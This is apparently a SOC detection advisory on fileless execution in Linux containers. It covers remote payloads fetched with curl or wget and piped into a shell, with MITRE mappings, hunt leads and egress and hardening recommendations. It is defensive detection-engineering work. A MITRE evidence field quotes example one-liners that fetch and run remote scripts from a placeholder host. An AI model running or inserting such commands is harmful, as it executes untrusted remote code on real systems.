---
brief_id: brief-2026-11-03-container-shell-pipe
event_id: brief-2026-11-03-container-shell-pipe
revision: 1
activity_at: "2026-11-03T21:48:19Z"
title: 'Container Environment: Suspicious Fileless Payload Execution via Shell Piping'
slug: 2026-11-container-shell-pipe
description: Detection of fileless execution patterns within Linux containers where remote payloads are fetched via curl or wget and immediately passed to a shell or scripting interpreter to bypass filesystem-based controls.
date: "2026-11-03T21:48:19Z"
type: advisory
types:
  - advisory
severities:
  - medium
exploitation_evidence:
  status: unknown
source_assessment:
  reliability: A
  credibility: "2"
  rating: A2
  likelihood: likely
qa_status:
  verdict: pass
tags:
  - container-security
  - fileless-execution
  - linux
  - detection-engineering
affected_os:
  - Linux
mitre_ttps:
  - tactic_id: TA0002
    tactic_name: Execution
    technique_id: T1059
    technique_name: Command and Scripting Interpreter
    evidence: This rule detects when a payload is downloaded and piped to a shell inside a running container.
    confidence_band: high
  - tactic_id: TA0002
    tactic_name: Execution
    technique_id: T1059.004
    technique_name: Unix Shell
    evidence: Attackers commonly run patterns like curl http://host/payload.sh | sh or wget -qO- http://host/bootstrap | bash.
    confidence_band: high
  - tactic_id: TA0011
    tactic_name: Command and Control
    technique_id: T1105
    technique_name: Ingress Tool Transfer
    evidence: This rule detects when a payload is downloaded and piped to a shell inside a running container.
    confidence_band: high
references:
  - https://github.com/elastic/detection-rules/blob/main/rules/integrations/cloud_defend/execution_payload_downloaded_and_piped_to_shell.toml
  - https://flare.io/learn/resources/blog/teampcp-cloud-native-ransomware
action_plan:
  priority: elevated
  owners:
    - SOC
    - Cloud Security
  immediate_actions:
    - action: Deploy the detection logic for curl/wget piped to shell within Linux container environments.
      owner: Detection Engineering
      due: 72h
      evidence: Source provides specific EQL rule logic for container environments.
  hunt_leads:
    - lead: Identify container exec sessions where curl or wget is followed immediately by a shell interpreter invocation.
      technique_id: T1059.004
      data_needed:
        - Process creation events (Sysmon/Auditd/Cloud Defend)
        - Command line arguments
        - Parent-child process relationship
      priority: high
      confidence: high
      disposition: hunt_now
      evidence: This rule detects when a payload is downloaded and piped to a shell.
  mitigation_plan:
    - priority: medium_term
      action: Enforce network policies to restrict outbound traffic from containers to untrusted external infrastructure.
      owner: Cloud Security
      addresses: T1105
      evidence: Piping remote content directly into a shell enables fast, stealthy execution.
---

This alert identifies potentially malicious fileless execution in Linux containers. Attackers often leverage the pattern of piping network-downloaded content directly into a shell (e.g., `curl <url> | sh`) to achieve code execution without writing artifacts to the container filesystem. This technique is primarily used during initial foothold or lateral movement to evade forensic analysis and disk-based security controls.

## Attack Chain

1. Initial access or lateral movement phase within a container.
2. Execution of a downloader utility (curl or wget).
3. Fetching of an external payload from a remote malicious server.
4. Piping of the remote payload output directly into a local shell or script interpreter (e.g., bash, sh, python, or perl).
5. Execution of the code in memory, bypassing persistent file scanning.
6. Potential follow-on activities, such as reverse shell spawning, crypto-miner installation, or container runtime socket access.

## Recommendation

- Implement runtime monitoring to detect the chaining of downloader processes (`curl`/`wget`) and scripting interpreters.
- Restrict interactive container access (exec sessions) via RBAC and just-in-time privilege requests.
- Apply egress network policies to limit container communication to known-good internal or external endpoints.
- Harden container images to remove unnecessary utilities like `curl` and `wget` where possible.
- Review and deploy the provided Elastic Defend for Containers rule logic to monitor for ephemeral pipe execution patterns.
